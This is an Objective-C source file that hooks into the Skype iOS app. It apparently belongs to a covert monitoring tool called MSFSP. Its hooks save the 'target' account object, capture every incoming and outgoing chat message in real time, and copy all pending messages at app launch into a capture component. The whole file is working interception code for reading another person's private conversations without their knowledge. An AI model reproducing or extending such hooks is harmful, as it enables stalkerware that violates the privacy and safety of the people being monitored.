/*
 *  Skype.h
 *  MSFSP
 *
 *  Created by Makara Khloth on 12/7/12.
 *  Copyright 2012 __MyCompanyName__. All rights reserved.
 *
 */

#import "SKConversationManager.h"
#import "SKConversation.h"

#import	"SKParticipant.h"
#import "SKContact.h"
#import "SkypeUtils.h"
#import "FxIMEvent.h"
#import "FxVoIPEvent.h"
#import	"FxRecipient.h"
#import "SKAccountManager.h"
#import "SKAccount.h"
#import "SKFileTransferManager.h"
#import "SKTransferMessage.h"
#import "QikThumbnailImage.h"
#import "SKImageScaler.h"
#import "SKVideoMessage.h"
#import "SKVideoMessage+Skype49.h"

#import "SKMessage+Skype48.h"
#import "SKMessage.h"
#import "ConversationLists+48.h"
#import "ConversationCenter.h"
#import "DomainObject.h"
#import "DomainObjectPool.h"
#import "SKConversationManager+Skype48.h"
#import "ContactLists.h"
#import "SKFileTransferManager+Skype48.h"
#import "SKPAppDelegate.h"

// version 5.x
#import "SKPAccount.h"
#import "SKPConversationLists.h"
#import "SKPConversation.h"

#import "SkypeWaiter.h"
#import "SkypeAccountUtils.h"


#pragma mark - Keep Information


// Save account
// For Skype version 5.0.3554
HOOK(SKPAccount, initWithAleObject$, id, id aleObject) {
    DLog (@"@@@@@@@@@@@@@@@@@@@ SKPAccount --> initWithAleObject @@@@@@@@@@@@@@@@@@@")
    id retVal = CALL_ORIG(SKPAccount, initWithAleObject$, aleObject);
    DLog(@"return %@", retVal)
    DLog(@"aleObject %@", aleObject)
    
    Class $SKPAccount = objc_getClass("SKPAccount");
    
    if ([retVal isKindOfClass:[$SKPAccount class]]) {
        DLog(@"Store Target Account Information")
        SKPAccount *account = retVal;
//        DLog(@"accountSubscriptions %@", [account accountSubscriptions])
//        DLog(@"loginStatusInfo %@", [account loginStatusInfo])
//        DLog(@"contact %@", [account contact])
//        DLog(@"status %d", [account status])
//        DLog(@"skypeName %@", [account skypeName])
        [[SkypeAccountUtils sharedSkypeAccountUtils] setMAccount:account];
    }
    return retVal;
}


#pragma mark -
#pragma mark Capture outgoing and incoming
#pragma mark -



/*********************************************************
 DIRECTION:			OUTGOING + INCOMING
 CAPTURING VERSION:	5.0.3554
 *********************************************************/


// This hook is called when user click chat view
//HOOK(SKPConversation, ensureMinimumNumberOfMessageItemsHaveBeenLoaded$, void,  unsigned messageItemsHaveBeenLoaded) {
////    DLog (@"@@@@@@@@@@@@@@@@@@@@@ SKPConversation --> ensureMinimumNumberOfMessageItemsHaveBeenLoaded @@@@@@@@@@@@@@@@@@@@@")
////    DLog (@"messageItemsHaveBeenLoaded %d", messageItemsHaveBeenLoaded)
//    
//    CALL_ORIG(SKPConversation, ensureMinimumNumberOfMessageItemsHaveBeenLoaded$, messageItemsHaveBeenLoaded);
//    
////    [[SkypeWaiter sharedSkypeWaiter] capturePendingIncomingMessagesInConversation:self];
//    
//}

// This hook is called when message
HOOK(SKPConversation, OnMessage$andMessageobjectid$, void, id message, unsigned messageobjectid) {
    DLog (@"@@@@@@@@@@@@@@@@@@@ SKPConversation --> OnMessage @@@@@@@@@@@@@@@@@@@")
    DLog (@"message: (class:%@) %@", [message class], message)
    DLog (@"message:%d",  messageobjectid)
    
    CALL_ORIG(SKPConversation, OnMessage$andMessageobjectid$, message, messageobjectid);
    
    @try {
        [[SkypeWaiter sharedSkypeWaiter] captureRealTimeMessageIDV2:messageobjectid conversation:self isPending:NO];
    }
    @catch (NSException *exception) {
        DLog(@"Skype exception: %@", exception);
    }
    @finally {
        ;
    }
}



#pragma mark - Capture Pending Message



HOOK(SKPAppDelegate, application$didFinishLaunchingWithOptions$, BOOL, id application, id options) {
    DLog (@"@@@@@@@@@@@@@@@@@@@ SKPAppDelegate --> didFinishLaunchingWithOptions @@@@@@@@@@@@@@@@@@@")
    
    DLog(@"application %@", application)
    DLog(@"options %@", options)
    
    BOOL retVal = CALL_ORIG(SKPAppDelegate,  application$didFinishLaunchingWithOptions$, application, options);
    
    // Must call this as soon as possible once application launch to get the original pending message before it has been update by the incoming message
    [[SkypeWaiter sharedSkypeWaiter] preparePendingIncomingMessages];
    
    // Start capturing the pending message from the store. This will capture only the messages that are the pending ones.
    // While this method is exectued, the content of pendinng message in store may be updated by the newly incoming one.
    // We don't care. Because we got the copy of all the pending messages in the store in the previous method already
    [[SkypeWaiter sharedSkypeWaiter] captureAllPendingIncomingMessages];
    
    return retVal;
}

// Save conversation list
HOOK(SKPConversationLists, init, id) {
    DLog (@"@@@@@@@@@@@@@@@@@@@ SKPConversationLists --> init ---------------------")
    id retVal = CALL_ORIG(SKPConversationLists, init);
    
    // Keep conversation list object to be used while capturing pending messages
    [[SkypeAccountUtils sharedSkypeAccountUtils] setMConversationList:retVal];
    
    return retVal;
}

